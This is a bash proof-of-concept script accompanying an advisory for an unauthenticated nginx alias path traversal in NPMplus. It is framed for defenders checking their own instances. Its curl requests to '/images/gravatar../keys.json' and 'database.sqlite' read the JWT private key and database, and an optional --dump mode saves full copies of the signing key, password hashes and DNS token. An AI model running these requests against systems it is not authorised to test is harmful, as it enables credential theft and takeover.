#!/usr/bin/env bash
#
# NPMplus — unauthenticated nginx alias off-by-slash path traversal (CWE-22)
# Advisory : GHSA-wj85-328x-ww6r         Reporter : Lyris Vale (@ValeLyris)
# Affected : 2025-12-29-b1 <= v < 2026-07-23-r1      Fixed : 2026-07-23-r1
#
# The same requests filed upstream (see ../README.md), wrapped so a defender can run
# this against their own instance without pulling secrets onto disk. Every request is
# unauthenticated. Run it only against an instance you own or are authorised to test.
#
# Usage : ./poc.sh [HOST:PORT] [--dump DIR]        default target 127.0.0.1:8081
# Exit  : 0 not affected   1 AFFECTED   2 inconclusive (usage, network, TLS)

set -uo pipefail

HOST="${1:-127.0.0.1:8081}"
case "$HOST" in -*) echo "usage: $0 [HOST:PORT] [--dump DIR]" >&2; exit 2;; esac
DUMP=""
if [ "${2:-}" = "--dump" ]; then
    DUMP="${3:-}"
    [ -n "$DUMP" ] || { echo "--dump needs a directory" >&2; exit 2; }
fi

C=(curl -sk --path-as-is --connect-timeout 5 --max-time 20)
U="https://${HOST}/images/gravatar.."
affected=0

echo "[*] target ${HOST}"

# 1. JWT signing key — report its shape, never print the key itself
key=$("${C[@]}" "${U}/keys.json") || { echo "[?] request failed (network or TLS) — inconclusive"; exit 2; }
if printf '%s' "$key" | grep -q 'PRIVATE KEY'; then
    echo "[!] keys.json readable unauthenticated — ${#key} bytes, contains a PEM private key"
    affected=1
else
    echo "[ok] keys.json not served — ${#key} bytes, no PEM marker"
fi

# 2. Database — 16 bytes is enough for the file magic; no customer data is fetched
magic=$("${C[@]}" -r 0-15 "${U}/database.sqlite" | tr -d '\0')
if [ "${magic:0:15}" = "SQLite format 3" ]; then
    echo "[!] database.sqlite readable unauthenticated — SQLite magic confirmed (16 bytes fetched)"
    affected=1
fi

# 3. Controls — these hold on a patched instance too. They show the disclosure came from
#    traversal rather than from the files simply being published.
echo "[*] control  alias root -> HTTP $("${C[@]}" -o /dev/null -w '%{http_code}' "https://${HOST}/images/gravatar/")  (expect 403, not listable)"
echo "[*] control /keys.json  -> HTTP $("${C[@]}" -o /dev/null -w '%{http_code}' "https://${HOST}/keys.json")  (expect 200 SPA HTML, not the key)"

if [ -n "$DUMP" ]; then
    mkdir -p -m 700 "$DUMP" || exit 2
    "${C[@]}" "${U}/keys.json"       -o "$DUMP/keys.json"
    "${C[@]}" "${U}/database.sqlite" -o "$DUMP/database.sqlite"
    chmod 600 "$DUMP"/keys.json "$DUMP"/database.sqlite 2>/dev/null
    echo "[*] full copies written to ${DUMP} — these are live secrets: signing key, password hashes, DNS token"
fi

if [ "$affected" -eq 1 ]; then
    echo "[RESULT] AFFECTED — update to 2026-07-23-r1, then revoke the DNS-provider token at the provider and rotate all passwords and keys.json"
    exit 1
fi
echo "[RESULT] not affected"
exit 0
